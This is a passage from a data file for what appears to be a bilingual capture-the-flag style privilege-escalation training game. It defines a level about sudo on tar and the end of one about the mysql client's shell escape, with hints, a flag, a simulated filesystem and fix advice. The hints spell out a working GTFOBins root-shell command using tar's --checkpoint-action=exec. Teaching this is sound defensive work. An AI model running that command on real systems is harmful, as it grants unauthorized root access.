                fix: "Never grant an interactive database client via sudo unless the target is trusted with the shell it's built on top of — there's no way to allow \"just queries\" once the client's own escape commands are in scope. Where automation genuinely only needs to run fixed queries, invoke mysql non-interactively with a locked-down script and no -e/--execute exposed to arbitrary input, and check GTFOBins before sudoers rules for any client with a REPL.",
                link: 'https://gtfobins.github.io/gtfobins/mysql/'
            },
            fr: {
                vuln: "NOPASSWD sudoers sur mysql (échappement shell intégré au client, GTFOBins)",
                why: "Un client de base de données paraît sûr, loin d'un shell — son seul travail est d'exécuter du SQL. Mais le mode interactif du CLI mysql a son propre langage de commandes au-dessus du SQL, préfixé par \\, et \\! est défini comme « exécuter une commande shell ». Ça a été conçu comme un confort pour les administrateurs qui basculent entre SQL et shell en pleine session, pas comme une frontière de privilèges — donc quand mysql lui-même tourne en root sous sudo, \\! donne un shell root sans aucun SQL impliqué.",
                fix: "N'accorde jamais un client de base de données interactif via sudo sauf si la cible est digne de confiance avec le shell sur lequel il repose — impossible d'autoriser « juste des requêtes » une fois que les commandes d'échappement du client entrent en jeu. Quand l'automatisation n'a réellement besoin que d'exécuter des requêtes fixes, invoque mysql en mode non interactif avec un script verrouillé, sans exposer -e/--execute à une entrée arbitraire, et vérifie GTFOBins avant toute règle sudoers pour un client avec un REPL.",
                link: 'https://gtfobins.github.io/gtfobins/mysql/'
            }
        }
    },
    // ─────────────────────────────────────────────────────────────
    // LEVEL 32 — sudo tar --checkpoint-action=exec (GTFOBins)
    // ─────────────────────────────────────────────────────────────
    {
        id: 32,
        codename: 'box-32',
        title: { en: 'Box-32 · Checkpoint Reached', fr: 'Box-32 · Point de contrôle atteint' },
        brief: {
            en: "sudo -l grants tar, nothing else — an archiver. It just reads and writes files... except it has a progress-reporting feature that runs a command of your choice along the way.",
            fr: "sudo -l n'accorde que tar, rien d'autre — un archiveur. Il ne fait que lire et écrire des fichiers... sauf qu'il a une fonctionnalité de suivi de progression qui exécute une commande de ton choix en chemin."
        },
        user: 'player',
        host: 'box-32',
        cwd: '/home/player',
        objectives: {
            en: ['Check sudo -l', 'Look up tar on GTFOBins', 'Use a checkpoint action to run a shell as root'],
            fr: ['Vérifier sudo -l', 'Chercher tar sur GTFOBins', 'Utiliser une action de checkpoint pour lancer un shell en root']
        },
        hints: {
            en: [
                'sudo -l — tar is allowed. Check GTFOBins for "tar".',
                'tar --checkpoint=N reports progress every N records; --checkpoint-action lets you say what "report" means.',
                'sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh — the action runs as whoever tar is running as.'
            ],
            fr: [
                'sudo -l — tar est autorisé. Regarde GTFOBins pour "tar".',
                "tar --checkpoint=N rapporte la progression tous les N enregistrements ; --checkpoint-action permet de définir ce que « rapporter » signifie.",
                "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh — l'action s'exécute avec les droits de celui qui fait tourner tar."
            ]
        },
        flag: 'flag{tar_checkpoint_action_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin', 'dev'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{tar_checkpoint_action_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'tar'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/tar': ELF_BIN(),
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': ELF_BIN(),
            '/dev': { type: 'dir', owner: 'root', mode: '755', children: ['null'] },
            '/dev/null': { type: 'file', owner: 'root', mode: '666', content: '' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/tar', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers NOPASSWD on tar (GTFOBins checkpoint-action hook)',
                why: "tar reads and writes archives — it's not an interpreter, so a NOPASSWD grant on it looks conservative. But tar's --checkpoint-action flag was built so long-running archive jobs could report progress via an arbitrary external command, and 'exec' is one of the documented actions. It runs at every checkpoint tar reaches on its own — no special input required beyond the flag — and since tar itself is root under sudo, that action is too. The archiving was never the risk; the progress-reporting hook bolted onto it was.",
                fix: "Never grant tar via sudo without restricting arguments — sudoers can pin the allowed flags (e.g. only a fixed backup command with no user-controlled options), since a bare NOPASSWD on the binary hands over every flag it supports, including --checkpoint-action. Check GTFOBins before writing sudoers rules for any tool with a plugin, hook, or callback mechanism, archivers included.",
                link: 'https://gtfobins.github.io/gtfobins/tar/'
            },
            fr: {
                vuln: "NOPASSWD sudoers sur tar (hook checkpoint-action, GTFOBins)",
                why: "tar lit et écrit des archives — ce n'est pas un interpréteur, donc un accès NOPASSWD dessus paraît raisonnable. Mais le flag --checkpoint-action de tar a été conçu pour que les jobs d'archivage longs puissent rapporter leur progression via une commande externe arbitraire, et 'exec' est l'une des actions documentées. Elle s'exécute à chaque checkpoint que tar atteint de lui-même — aucune entrée spéciale requise au-delà du flag — et comme tar lui-même tourne en root sous sudo, cette action aussi. L'archivage n'a jamais été le risque ; le hook de rapport de progression greffé dessus l'était.",
                fix: "N'accorde jamais tar via sudo sans restreindre les arguments — sudoers permet de figer les flags autorisés (par exemple une commande de sauvegarde fixe sans option contrôlée par l'utilisateur), car un NOPASSWD nu sur le binaire donne accès à tous les flags qu'il supporte, y compris --checkpoint-action. Vérifie GTFOBins avant d'écrire des règles sudoers pour tout outil avec un mécanisme de plugin, de hook ou de callback, archiveurs compris.",
                link: 'https://gtfobins.github.io/gtfobins/tar/'
            }
        }
    }
];
